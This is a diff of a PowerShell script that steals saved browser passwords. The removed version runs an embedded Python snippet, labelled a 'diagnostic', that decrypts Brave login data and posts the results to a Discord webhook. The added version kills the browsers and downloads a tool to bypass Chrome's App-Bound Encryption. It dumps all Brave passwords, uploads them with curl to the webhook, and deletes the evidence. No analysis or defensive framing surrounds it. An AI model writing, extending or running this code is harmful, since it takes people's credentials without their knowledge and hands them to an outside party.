@@ -6,70 +6,67 @@ function Send-Discord {
     Invoke-RestMethod -Uri $wh -Method Post -Body $body -ContentType "application/json" | Out-Null
 }
 
-Send-Discord "🔍 Starting diagnostic..."
+Send-Discord "🚀 Downloading ChromeElevator to bypass App-Bound Encryption..."
 
-cd $env:TEMP\py
+Get-Process brave,msedge,chrome -EA 0 | Stop-Process -Force -EA 0
+Start-Sleep 5
 
-$pythonScript = @'
-import sqlite3,os,base64,win32crypt,json
-from Crypto.Cipher import AES
+cd $env:TEMP
 
-b=os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
-ld=b+r'\Default\Login Data'
-ls=b+r'\Local State'
-
-try:
-    with open(ls) as f:
-        key=win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:],None,None,None,0)[1]
+try {
+    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
     
-    print(f'KEY_LEN:{len(key)}')
+    # Télécharger ChromeElevator
+    Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v1.0.0/chromelevator.exe" -OutFile "ce.exe" -UseBasicParsing
     
-    import shutil
-    shutil.copy2(ld,'t.db')
+    if (!(Test-Path "ce.exe")) {
+        Send-Discord "❌ Download failed"
+        exit
+    }
     
-    c=sqlite3.connect('t.db')
-    r=c.execute('SELECT origin_url,username_value,password_value FROM logins WHERE username_value!="" LIMIT 1').fetchone()
+    Send-Discord "✅ ChromeElevator downloaded, extracting Brave passwords..."
     
-    if r:
-        print(f'URL:{r[0]}')
-        print(f'USER:{r[1]}')
-        print(f'ENC_LEN:{len(r[2])}')
-        print(f'PREFIX_HEX:{r[2][:3].hex()}')
-        print(f'FIRST_100_HEX:{r[2][:100].hex()}')
+    # Exécuter ChromeElevator
+    $output = .\ce.exe brave --output passwords.json 2>&1 | Out-String
+    
+    Start-Sleep 5
+    
+    if (Test-Path "passwords.json") {
+        $data = Get-Content "passwords.json" -Raw | ConvertFrom-Json
         
-        nonce=r[2][3:15]
-        tag=r[2][-16:]
-        cipher_text=r[2][15:-16]
+        if ($data.passwords) {
+            $count = $data.passwords.Count
+            Send-Discord "✅ Found $count passwords!"
+            
+            $report = "BRAVE PASSWORDS (v20 decrypted)`n" + ("="*50) + "`n`n"
+            
+            foreach ($pwd in $data.passwords) {
+                $report += "URL: $($pwd.url)`n"
+                $report += "Username: $($pwd.username)`n"
+                $report += "Password: $($pwd.password)`n`n"
+            }
+            
+            $report | Out-File "decrypted.txt" -Encoding UTF8
+            
+            # Upload via curl
+            curl.exe -F "file=@decrypted.txt" $wh 2>$null
+            
+            Remove-Item "decrypted.txt" -Force
+        } else {
+            Send-Discord "⚠️ JSON found but no passwords inside"
+            Send-Discord $output
+        }
         
-        print(f'NONCE_HEX:{nonce.hex()}')
-        print(f'TAG_HEX:{tag.hex()}')
-        
-        try:
-            aes=AES.new(key,AES.MODE_GCM,nonce=nonce)
-            pwd=aes.decrypt_and_verify(cipher_text,tag)
-            print(f'DECRYPTED_RAW:{pwd}')
-            print(f'DECRYPTED_UTF8:{pwd.decode("utf-8",errors="ignore")}')
-        except Exception as e:
-            print(f'DECRYPT_ERROR:{e}')
-    else:
-        print('NO_PASSWORDS')
+        Remove-Item "passwords.json" -Force
+    } else {
+        Send-Discord "❌ No JSON output created"
+        Send-Discord "Output: $output"
+    }
     
-    c.close()
-    os.remove('t.db')
+    Remove-Item "ce.exe" -Force -EA 0
     
-except Exception as e:
-    print(f'FATAL_ERROR:{e}')
-'@
-
-$pythonScript | Out-File "diag.py" -Encoding UTF8
-
-$result = .\python.exe diag.py 2>&1
-
-Remove-Item diag.py -Force
-
-foreach ($line in $result) {
-    Send-Discord $line
-    Start-Sleep -Milliseconds 500
+} catch {
+    Send-Discord "❌ Error: $($_.Exception.Message)"
 }
 
-Send-Discord "✅ Diagnostic complete"
+Send-Discord "🏁 Finished"
